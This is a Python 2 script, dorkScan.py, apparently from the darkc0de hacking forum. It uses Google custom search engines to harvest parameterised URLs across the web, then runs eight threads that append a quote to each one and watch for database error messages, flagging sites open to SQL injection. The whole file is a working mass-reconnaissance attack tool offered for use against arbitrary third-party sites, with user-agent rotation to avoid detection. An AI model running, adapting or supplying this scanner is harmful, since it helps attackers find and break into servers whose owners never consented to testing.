##!/usr/bin/python
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 
# dorkScan.py
#
# darkc0de Crew 
# www.darkc0de.com 
# code low1z
#
# Greetz to 
# d3hydr8, rsauron, baltazar, inkubus, kopele, p47rick, houby
# and the rest of the Darkc0de members 

import string, sys, time, urllib2, cookielib, re, random, threading, socket
from random import choice
from optparse import OptionParser

threads = []
numthreads = 8
timeout = 4
socket.setdefaulttimeout(timeout)
version = '0.1a'
ldm = 'jun_22_09'

rSA = [2,3,4,5,6]

CXdic = {'blackle': '013269018370076798483:gg7jrrhpsy4',
         'ssearch': '008548304570556886379:0vtwavbfaqe',
         'redfront': '017478300291956931546:v0vo-1jh2y4',
         'bitcomet': '003763893858882295225:hz92q2xruzy',
         'dapirats': '002877699081652281083:klnfl5og4kg',
         'darkc0de': '009758108896363993364:wnzqtk1afdo',
         'googuuul': '014345598409501589908:mplknj4r1bu'}

SQLeD = {'MySQL': 'error in your SQL syntax',
         'Oracle': 'ORA-01756',
         'MiscError': 'SQL Error',
         'JDBC_CFM': 'Error Executing Database Query',
         'JDBC_CFM2': 'SQLServer JDBC Driver',
         'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
         'MSSQL_Uqm': 'Unclosed quotation mark',
         'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
         'MS-Access_JETdb': 'Microsoft JET Database'}


filetypes = ['php','php5','asp','aspx','jsp','htm','html','cfm']

header = ['Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
          'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
          'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
          'Microsoft Internet Explorer/4.0b1 (Windows 95)',
          'Opera/8.00 (Windows NT 5.1; U; en)']

gnum = 100

def cxeSearch(go_inurl,go_site,go_cxe,go_ftype,maxc):
	uRLS = []
	counter = 0
       	while counter < int(maxc):
              	jar = cookielib.FileCookieJar("cookies")
                query = 'q='+go_inurl+'+'+go_site+'+'+go_ftype
                results_web = 'http://www.google.com/cse?'+go_cxe+'&'+query+'&num='+str(gnum)+'&hl=en&lr=&ie=UTF-8&start=' + repr(counter) + '&sa=N'
                request_web = urllib2.Request(results_web)
		agent = random.choice(header)
                request_web.add_header('User-Agent', agent)
		opener_web = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
                text = opener_web.open(request_web).read()
		strreg = re.compile('(?<=href=")(.*?)(?=")')
                names = strreg.findall(text)
		counter += 100
                for name in names:
                      	if name not in uRLS:
                               	if re.search(r'\(', name) or re.search("<", name) or re.search("\A/", name) or re.search("\A(http://)\d", name):
                                       	pass
				elif re.search("google", name) or re.search("youtube", name) or re.search(".gov", name) or re.search("%", name):
                                       	pass
				else:
                                      	uRLS.append(name)
	tmpList = []; finalList = []
	print "[+] URLS (unsorted) :", len(uRLS)
        for entry in uRLS:
		try:
			t2host = entry.split("/",3)
			domain = t2host[2]
			if domain not in tmpList and "=" in entry:
				finalList.append(entry)
				tmpList.append(domain)
		except:
			pass
	print "[+] URLS (sorted)   :", len(finalList)
	return finalList

class injThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts;self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for url in urls:
                        try:
                                if self.check == True:
                                        ClassicINJ(url)
                                else:
                                        break
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False


def ClassicINJ(url):
        EXT = "'"
        host = url+EXT
        try:
                source = urllib2.urlopen(host).read()
                for type,eMSG in SQLeD.items():
                        if re.search(eMSG, source):
                                print "V. Found:", host, "Error Type:", type
                        else:
                                pass
        except:
                pass

parser = OptionParser()
parser.add_option("-i" ,type='string', dest='inurl',action='store', help="inurl: operator")
parser.add_option("-s", type='string', dest='site',action='store', help="site: operator")
parser.add_option("-c", type='string', dest='cxe',action='store', default='blackle', help="custom serach engine (blackle,ssearch,redfront,bitcomet,dapirats,darkc0de,googuuul)")
parser.add_option("-f", type='string', dest='filetype',action='store', default='php', help="server side language filetype")
parser.add_option("-m", type='string', dest='maxcount',action='store',default='500', help="max results (default 500)")
(options, args) = parser.parse_args()

print "+-----------------------------------+"
print "| dorkScan.py			   |"   
print "| coded by low1z for darkc0de.com   |"
print "| -h for help			   |"   
print "+-----------------------------------+"
if options.inurl != None:
	print "[+] inurl  :",options.inurl
	go_inurl = 'inurl:'+options.inurl
if options.inurl != None:
	if options.filetype in filetypes:
		print "[+] filetype  :",options.filetype
		go_ftype = 'inurl:'+options.filetype
	else:
		print "[+] inurl-filetype  : php"
		go_ftype = 'inurl:php'
if options.site != None:
	print "[+] site   :",options.site
	go_site = 'site:'+options.site
if options.cxe != None:
	if options.cxe in CXdic.keys():
		print "[+] CXE    :",CXdic[options.cxe]
		ccxe = CXdic[options.cxe]
	else:
		print "[-] CXE    : no Proper CXE defined, using blackle"
		ccxe = CXdic['blackle']
	go_cxe = 'cx='+ccxe
print "[+] MaxRes :",options.maxcount
cuRLS = cxeSearch(go_inurl,go_site,go_cxe,go_ftype,options.maxcount)
mnu = True
while mnu == True:
	print "\n[1] Injection Testing"
	print "[2] Save Urls to File"
	print "[3] Show Urls"
	print "[0] Exit\n"
	chce = raw_input(":")
	if chce == '1':
		i = len(cuRLS) / int(numthreads)
		m = len(cuRLS) % int(numthreads)
		z = 0
		if len(threads) <= numthreads:
			for x in range(0, int(numthreads)):
	        		sliced = cuRLS[x*i:(x+1)*i]
		                if (z < m):
		                	sliced.append(cuRLS[int(numthreads)*i+z])
		                        z += 1
				thread = injThread(sliced)
	        	        thread.start()
		                threads.append(thread)
		for thread in threads:	
			thread.join()
	if chce == '2':
		fn = raw_input("filename :")
		fnp = open(fn, "w")
		for entry in cuRLS:
			fnp.write(entry+'\n')
	if chce == '3':
		for entry in cuRLS:
			print entry
	if chce == '0':
		mnu = False
